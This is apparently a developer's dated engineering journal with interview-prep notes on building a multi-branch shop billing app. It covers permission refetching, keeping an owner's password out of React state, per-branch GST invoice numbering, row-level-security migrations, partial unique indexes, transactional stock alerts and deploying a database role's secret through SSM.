- **What happened:** the staff screens hide what a login may not use: sidebar entries, and a plain "You can't open this page" for a route typed by address. The permissions come from `GET /api/session`. The owner can take one away while a cashier's screen is open, so the screen re-reads the session in two cases: when the window gets focus (TanStack Query's `refetchOnWindowFocus: 'always'`, because the session's `staleTime` is infinite and a normal focus refetch skips fresh data) and straight after any `403 forbidden` answer (the API client tells the same listener that already reacts to `401 locked`). Each route names its permission in its `staticData`, and one `PermissionGate` in the app layout checks it, so no page can forget.
- **Why / what I learned:** the screen's copy of the permissions can only ever be out of date, never trusted. The server checks every request, so the worst a stale screen does is show a button that answers 403, and that 403 is what fixes the screen. A route guard in one place is safer than a check in every page.
- **Say it in an interview:** "Hiding a button is a courtesy, not security. The server re-reads permissions on every request; the web app refetches the session on focus and after any 403, so a change the owner makes shows within seconds, and a cashier in the middle of a bill isn't thrown out."
- **Follow-ups to expect:** why not push the change over a WebSocket? (more moving parts for a change that happens a few times a month; focus plus 403 is enough) What if the person never refocuses? (their next refused request fixes the screen)

### 2026-11-22 — The owner's password never goes into React state `#frontend` `#security` `#react`
- **What happened:** billing's discount approval already asked the owner for their password, with the password in `useState`. Staff needed the same dialog for five actions, so I extracted one `OwnerPasswordDialog` that both use. This one never puts the password in state: the box is uncontrolled, the submit handler reads it once from `FormData`, empties the input, and passes the value straight to the request. A wrong password shows an error and the dialog stays open with an empty box; the staff action's other typed fields (the new password) stay. A test holds the request in flight and checks that the box is already empty and the text is nowhere in the page.
- **Why / what I learned:** a secret in state lives in React's memory, in dev tools and in any error report that serialises state until the component unmounts. An uncontrolled field keeps it in the browser's input only. The shared component takes the actions' differences as props (a `children` slot for extra fields, an `onSubmit` that sends), not as copies of the dialog.
- **Say it in an interview:** "Secrets shouldn't sit in app state. The dialog reads the owner's password from the form on submit, clears the field and hands the value to the request in one call, and a test checks it is gone while the request is still in flight."
- **Follow-ups to expect:** does the browser still hold it? (in the request body in flight, and the network log of a dev tools session on that machine; that is the trust boundary of a shop's counter) Why a native `<dialog>`? (ADR 0026: the CSP blocks Radix's injected styles)

### 2026-11-22 — Three small things the staff screens taught me `#frontend` `#testing` `#gotcha`
- **What happened:** (1) `react-refresh/only-export-components` refused a file that exported both a hook and the components it draws, so the hook (which dialog is open) and the components got separate files; the same rule moved `buttonVariants` out of `button.tsx`. (2) A test that waited for `role="status"` found two: the connection badge's "Connected" and my "Password changed", so I wait for the text instead. (3) `findByLabelText` returns as soon as the label exists, so asserting a field's error description right after it passed or failed by timing. `waitFor` around the description assertion fixed it. I also kept the owner dialog's `<form>` outside the page `<form>`, since nested forms are invalid HTML and break submit.
- **Why / what I learned:** a lint rule that looks pedantic often points at a real seam (a hook is logic, a component is drawing). And in async UI tests, wait for the thing you assert on, not for something near it.
- **Say it in an interview:** "I wait on the exact thing I assert, not on a neighbour of it, so a timing change doesn't make a test flaky."
- **Follow-ups to expect:** why test text rather than role=status? (roles are shared across the page: always scope a query to a region or use unique text)

### 2026-11-22 — The computer decides the branch; the owner's picker only changes what pages show `#architecture` `#gst` `#security` `#decision` → ADR 0045
- **What happened:** P1.6 lets one business run several shops. The question was which branch a bill or a stock change belongs to when the owner can look at every shop. Three designs: the computer decides (chosen), the owner's picker switches the whole session, or a branch box on every form. A device row already stores its branch and a session copies it, so every write already uses `Caller.branchId`; I only added `?branch=<id>|all` to the read routes (the item list's stock column, an item's stock per branch, its movement history). The owner's first login on a new computer in a business with two or more branches answers `409 choose_branch` with the list and is sent again with `branchId`; one branch changes nothing. Moving a computer needs the owner's password and ends the sessions on it. Staff may log in only on a computer at their home branch or a branch the owner ticked, and that is checked on every request next to the permissions, so unticking ends a logged-in cashier's session at their next click.
- **Why / what I learned:** under GST the place of supply follows where the goods are handed over, so a bill printed in Andheri must carry Andheri's address, GSTIN and invoice series, whoever is logged in. If writes have no branch input, nobody can save something at the wrong branch by forgetting a picker. The risky part of "a permission can change under a running session" is the gap between a check and the commit, so the branch row is locked `FOR SHARE` by a login, a staff edit and a computer move, and `FOR UPDATE` by archiving: they serialise, and a computer can't be registered or a login made at a branch while it is being closed.
- **Say it in an interview:** "I made the computer decide the branch for everything written, and gave the owner a picker that only changes what read pages show. A bill carries the address and invoice number of the shop it was made in, and with no branch field on any write form there is nothing to forget. Staff can work only at their home or ticked branches, read on every request like permissions, so unticking applies on the next click. I rejected a session-switching picker because it could print Thane's address on an Andheri bill."
- **Follow-ups to expect:** how does the owner enter something for another branch? (go to that branch's computer, or a later form with its own branch box, e.g. purchases) What if two people archive and log in at once? (row locks, `FOR SHARE` against `FOR UPDATE`, so one waits and then sees the other's result) Why is the branch check in the request path and not only at login? (so a change reaches an open session)

### 2026-11-22 — One invoice series per branch, with the branch code in the number `#gst` `#database` `#architecture` `#decision` → ADR 0045
- **What happened:** with several branches under one GSTIN, two shops must never print the same invoice number in a year. Two ways: one counter for the whole business, or one counter per (branch, financial year). I chose per branch and add the branch's short code to the number once a business has a second branch (`ABC/AND/2026-27/001`, `ABC/THN/2026-27/001`); a one-branch business keeps the format it chose. P1.6 only adds `branches.code` (1 to 6 capital letters or digits, unique per business, checked in the database); the counter itself comes with saving bills (P1.14).
- **Why / what I learned:** a gapless counter has to be taken under a row lock when the bill saves. One counter for the whole business would make two counters in two shops wait for each other on that lock at rush hour. A counter per branch removes the contention, and the code in the number keeps every number unique and tells which shop issued it.
- **Say it in an interview:** "Invoice numbers have to be unique and gapless per year, which means a lock at save time. I made the counter per branch and per financial year, with the branch code in the number, so two shops never wait on one lock and still never collide. A business with a single branch sees no code."
- **Follow-ups to expect:** why must the numbers be gapless? (GST rules expect a consecutive series; a cancelled bill is kept, never deleted) What if the owner renames a branch's code? (old bills keep the text they were printed with; the counter is keyed by branch id, not by the code)

### 2026-11-22 — A backfill that changes nothing, and a subquery that counted the wrong table `#database` `#testing` `#gotcha` `#mistake`
- **What happened:** (1) `branches.code` is new and `NOT NULL`, so the migration has to fill the branches that already exist. Forced row-level security hides every row from the migration role, so a plain `UPDATE` would change 0 rows with no error and `SET NOT NULL` would then fail. The migration runs the update between `NO FORCE` and `FORCE ROW LEVEL SECURITY` (DDL is transactional). To prove it I built a second database inside the test container, migrated it to 0013, inserted businesses and branches as the superuser, ran 0014, and checked the codes (`HO` for each business's oldest branch, `B2` and `B3` for any others), that the migration role saw 0 rows before, and that `FORCE` was back. (2) The branch list's "computers" column came back 0 for the head office, which has a computer. The query was written with Drizzle's `${devices.branchId} = ${branches.id}` inside a subquery of a single-table select. Drizzle prints a single-table query's columns without their table name, so `id` meant the inner table's `id`, and the count compared a device's branch to its own id. The test caught it; the fix is to write the subquery's column names out (`d.branch_id = "branches"."id"`).
- **Why / what I learned:** a migration test must start from the old schema with data in it, or it proves nothing about the data path. And a query builder's helpers hide qualification rules: when a subquery reads the same column name as the outer table, qualify it by hand and assert the count in a test.
- **Say it in an interview:** "My backfill migration would have silently changed zero rows because the migration role is subject to forced row-level security. I turn it off for one statement inside the migration's transaction, and a test migrates a scratch database to the previous version, inserts rows, runs the new migration and checks them. A separate bug taught me that an ORM can print unqualified column names in a subquery, so a correlated count silently counted the wrong thing."
- **Follow-ups to expect:** why not give the migration role BYPASSRLS? (it would weaken the one role that owns every table; a statement-sized exception is safer) Why does `staff_branches` have a DELETE grant when nothing else does? (it is permission data, not a business record; every tick and untick is in the entry log, and the tenancy guard has a one-name allowed list so any other DELETE grant still fails)

### 2026-11-22 — Alerts are raised in the same transaction as the stock change, not through the worker or on read `#architecture` `#database` `#backend` `#decision` → ADR 0046
- **What happened:** P2.7 part 2 adds the bell for low and out-of-stock items. There were three ways to know an item is low: (A) compare stock with its level inside the same transaction that changes the stock and write an alert row; (B) write an event and let the worker raise the alert later; (C) compute it every time someone opens the bell. I chose A. `moveStock` already knows each item's final balance, so after updating the stock rows it calls `syncStockAlerts`, which asks two pure functions what the alert should be (`stockAlert`) and what to do about the open one (`raiseOrClear`: raise, update the numbers, change type, clear, or nothing). The same call runs when an item's low-stock level is saved and when it is archived or restored. A test throws after the alert was written and finds neither the alert nor the stock movement afterwards.
- **Why / what I learned:** B makes the alert late and lets it drift from the stock if a job is lost, and the outbox is for messages to the outside world, not for the app's own data. C can't remember "raised once" or "dismissed by me", so I would have had to invent a row anyway, and it would also compare every item on every poll. A costs a few reads per stock change and one rule: whoever changes what an alert depends on must call the sync. The pure functions mean the rules (out of stock at 0 whatever the level, low only with a level above 0) are tested without a database.
- **Say it in an interview:** "The alert is a row written in the same transaction as the stock change, so it can never disagree with the stock and a failed bill leaves nothing behind. I considered an outbox and worker, and computing on read, and rejected both: one is late and can drift, the other has nowhere to remember a dismissal. The decision logic is two pure functions I tested on their own; the database code only applies their answer."
- **Follow-ups to expect:** what about time-based alerts like expiry? (no change to hang on, so a daily worker job calls the same functions) What if a new code path changes stock without going through `moveStock`? (it would leave a stale alert until the next change; `moveStock` is the only write path by design, and a test audits that no open alert disagrees with its stock) Why not a database trigger? (it would hide business rules in SQL and can't use the shared pure functions)

### 2026-11-22 — "One open alert" with a partial unique index `#database` `#architecture` `#gotcha`
- **What happened:** an item must have at most one open stock alert per branch, but any number of cleared ones as history, and "low" and "out of stock" must be the same alert changing type, never two at once. A plain unique constraint can't say "only while not cleared". A partial unique index can: `unique (business_id, branch_id, subject_type, subject_id, family) where cleared_at is null`. The `family` column (`stock` for both types) is what makes low and out collide, and a check on the `(type, family)` pair stops them disagreeing. A test inserts a second open alert of either type and gets PostgreSQL error `23505` on `alerts_open_unique`, then clears the first and the insert works.
- **Why / what I learned:** the database, not the code, holds the invariant, so even a bug or two requests at once can't create a duplicate. The same trick works for "one live barcode per code" and "one open held bill per key" elsewhere in this project. A cleared row keeps the history for the daily summary, and a dismissal belongs to the row, so an alert that clears and comes back is a new row and shows again.
- **Say it in an interview:** "I enforce 'one active alert per item' with a partial unique index, which only covers rows where `cleared_at is null`. History accumulates freely, but a second active row is refused by PostgreSQL itself."
- **Follow-ups to expect:** how does the code react to the conflict? (it never inserts when one is open: it compares first, under the item's lock, and the index is the backstop) Why store `family` instead of using `type` in the index? (two types must collide in one index, so the index needs one value for both)

### 2026-11-22 — A conditional upsert tells you what it really changed `#database` `#backend` `#gotcha`
- **What happened:** saving an item rewrites its low-stock levels with an upsert whose `DO UPDATE` has a `WHERE` that skips levels that haven't changed (so their row keeps its time). I needed to know whether any level really changed, to decide if alerts should be re-checked, and re-comparing the old and new lists in code was clumsy. `INSERT ... ON CONFLICT DO UPDATE ... WHERE ... RETURNING id` only returns the rows that were actually inserted or updated, so the number of returned rows is exactly "how many levels changed".
- **Why / what I learned:** `RETURNING` reports the rows the statement touched, so a skipped conflict row isn't in it. That turns a write into its own change detector, with no second query. Related gotcha the same day: `drizzle-kit generate` loads the schema, which imports the shared package's built `dist/`, so the shared package must be built first or it fails with "Cannot find module".
- **Say it in an interview:** "I let the upsert tell me whether it changed anything by reading its RETURNING rows, and only then re-evaluate the alerts, so a rename of an item costs no extra work."
- **Follow-ups to expect:** what if two rows change? (the count is above 0 and I re-check the whole item, which is cheap) Why not compare before and after in code? (more code and a race if two edits cross)

### 2026-11-22 — Deploying a new database role: secret to SSM, role to RDS, connection string to one container `#devops` `#cloud` `#security`
- **What happened:** the job queue (#60) logs in as its own role, `app_queue`, which the live database didn't have. #62 made Terraform put a random password straight into an SSM `SecureString` as a write-only value (`value_wo`, ephemeral `random_password`), so it never appears in state or git. Each deploy's `bootstrap-db.sh` runs the safe-to-repeat role script on RDS with it. At boot, `start.sh` writes `QUEUE_DATABASE_URL` into `/run` (memory only, root only), and only the worker container gets that file. The apply showed 1 added and cost $0. Then RDS was started before the server, the PR merged, the deploy approved, and the live check and the worker's log read over SSM Run Command.
- **Why / what I learned:** a new credential has four places to land: the secret store, the database, the boot script and the container. Missing any one stops the worker at start, so the deploy order matters (parameter first, database up, then deploy). The worry was RDS: its admin isn't a real superuser, and `GRANT app_queue TO app_owner` needs ADMIN on the role. PostgreSQL 16+ gives that to the role's creator, and the first RDS run confirmed it.
- **Say it in an interview:** "Each process gets only the credentials it needs. The queue's password goes from a random generator straight into an encrypted parameter, never into Terraform state or git. The server reads it at boot into a memory-only file, and only the worker container mounts it. I sequenced it as infrastructure first, then the database role, then the app, and verified each step from outside and from the server's logs."
- **Follow-ups to expect:** why SSM and not Secrets Manager? (standard parameters are free, and Secrets Manager bills per secret even when idle) How do you rotate it? (bump `app_password_version`, apply, and the next deploy's role script sets the new password, because it runs on every deploy).

### 2026-11-22 — Merging four parallel lanes: renumbered migrations, `BEHIND` PRs and a 72-character title `#git` `#github` `#process` `#gotcha`
- **What happened:** P1.6 and the alerts work, built in parallel, both generated migration 0014. After #64 merged, the alerts rebase conflicted on the Drizzle journal and snapshot. I took main's, deleted the alerts SQL, ran `db:generate` again (it came out as 0015, identical), re-added the hand-written `FORCE ROW LEVEL SECURITY` lines, and fixed two tests whose second branch now needed a `code`. Separately, #63 sat `BEHIND` after #62 merged, and #64 failed the title check at 73 characters.
- **Why / what I learned:** a migration number is a shared counter, so parallel branches collide by design. The generated SQL is reproducible, but hand edits must be carried over by hand. A required-checks rule that demands an up-to-date branch serialises merges.
- **Say it in an interview:** "We ran up to four lanes in parallel, each its own branch and PR, merged one at a time. When two lanes both added migration 14, the one merging second regenerated its migration from its schema against the new main and re-applied its manual edits. Branch protection made each PR rebuild on the latest main before merging, so the tests always ran against what would ship."
- **Follow-ups to expect:** why not number by timestamp? (Drizzle's journal orders them anyway, and two migrations touching the same table would still need re-checking after a rebase).

### 2026-11-22 — A test that raced the database clock by less than a millisecond `#testing` `#database` `#bug`
- **What happened:** a docs-only PR (#66) failed CI in an alerts test. The test inserted a cleared alert with `clearedAt: new Date()`, while `raised_at` took the database default `now()`. The check `cleared_at >= raised_at` refused the row. It passed on every earlier run.
- **Why / what I learned:** JavaScript dates have millisecond precision and PostgreSQL timestamps have microseconds. `now()` is the transaction start, say 01.088400; a `new Date()` taken a few microseconds later is truncated to 01.088, which is *earlier*. Two clocks with different precision can disagree about order inside one millisecond. The app avoids it by stamping both columns with the database's `now()`. The test now raises the alert a minute earlier (#67).
- **Say it in an interview:** "A flaky test turned out to be a precision race: the test's clock had milliseconds and the database's microseconds, so a 'later' timestamp could sort earlier. In production every timestamp in a row comes from one clock, the database's, and in tests I never mix the two for values a constraint compares."
- **Follow-ups to expect:** why didn't it fail locally? (it needs the insert to land in the same millisecond as the transaction start, which is rare and depends on machine speed).


### 2026-11-22 — A password that must come back for a second request, without living in React state `#frontend` `#security` `#gotcha`
- **What happened:** the owner's first login on a new computer in a business with two shops answers `409 choose_branch` and the browser must ask "which shop is this computer in?" and then send the same login again with the choice. Keeping the password for that second request would normally mean storing it in React state. Instead the login form stays mounted and its email and password boxes keep their text; the branch list appears inside the same form, and the second submit reads the boxes again. Two smaller things the same day: a route's `staticData` (`branchPicker: true`) decides which pages show the branch picker, so the picker never appears on a page that ignores it; and a context plus its hook had to live in a separate file from the provider component, or the `react-refresh/only-export-components` lint rule fails.
- **Why / what I learned:** a secret needed twice should stay where it already is (an uncontrolled input) instead of being copied somewhere new. The same rule is why the shared owner's-password dialog empties its box before it sends. Test stubs that answer unknown URLs with a health JSON hide a missing route until a component calls `.filter` on it, so every new endpoint a page reads needs a line in the stubs of the tests that open that page.
- **Say it in an interview:** "A two-step login that needs the password twice reads it from the form's own input both times, so the password is never copied into app state, a store or the URL."
- **Follow-ups to expect:** what if the user edits the email between the two steps? (the second request just carries the new values and the server checks them again) Why not return a token from step one? (that adds a server-side half-logged-in state to expire and secure for no gain).

### 2026-11-22 — A dismissal that remembers how bad it was: "show again when it gets worse" without deleting `#database` `#backend` `#product`
- **What happened:** the owner decided that a dismissed low-stock alert must show again when the item runs out. The first design tied a dismissal to the alert row, and low to out of stock is the same row changing its type, so it stayed hidden. The app's database role can't DELETE (business records are never hard-deleted), so I couldn't just drop the dismissal when the alert got worse. Instead the dismissal stores the alert's type at that moment (`dismissed_type`), and the bell's query hides an alert only while its severity is no more than the dismissed one (low = 1, out = 2). Dismissing again is an upsert that moves the type up. Tests: low to out re-shows, out to low stays hidden, and a second person's dismissal is separate.
- **Why / what I learned:** when a rule is "hide until X happens", store what the person saw and compare on read, instead of mutating or deleting rows when X happens. It keeps the writer (`syncStockAlerts`) ignorant of dismissals, needs no delete, and an out, low, out wobble can't pester someone who already dismissed "out". The migration added a NOT NULL column to a table with forced row-level security, so a backfill `UPDATE` as the migration role would have matched no rows; a column default that is dropped straight after fills existing rows safely.
- **Say it in an interview:** "A dismissal records the severity the user acknowledged. The list query compares the alert's current severity with it, so a worse alert reappears and a better one doesn't, with no deletes and no extra work when stock changes."
- **Follow-ups to expect:** why not delete the dismissal when the type changes? (the app role has no DELETE by design, and the writer would then need to know about per-person dismissals) Why a severity number and not 'type differs'? (low, out, low would re-show on the way back, which is getting better, not worse).
